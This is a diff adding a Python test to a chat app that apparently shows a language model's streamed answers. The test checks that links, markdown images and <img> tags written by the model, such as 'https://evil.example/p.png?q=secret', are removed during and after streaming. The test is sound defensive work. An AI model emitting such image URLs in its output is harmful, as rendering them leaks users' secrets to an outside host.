@@ -388,3 +388,13 @@ def test_whom_to_ask_label_in_bold_and_stable_while_streaming():
         assert all(b.startswith(a) for a, b in zip(shown, shown[1:])), raw
         assert label in shown[-1]
     assert api.bold_ask("To sign a contract you need [1].") == "To sign a contract you need [1]."
+
+
+def test_links_and_images_written_by_the_model_are_not_shown():
+    from app import api
+    raw = 'Tu as 5 jours [L6222-35]. ![x](https://evil.example/p.png?q=secret) Voir [ce site](https://evil.example/a) <img src="https://evil.example/i">.'
+    out = api.no_model_links(raw, final=True)
+    assert "evil.example" not in out and "ce site" in out and "[L6222-35]" in out
+    shown = [api.no_model_links(raw[:i]) for i in range(len(raw) + 1)]
+    assert all("evil.example" not in x for x in shown)
+    assert all(b.startswith(a) for a, b in zip(shown, shown[1:]))
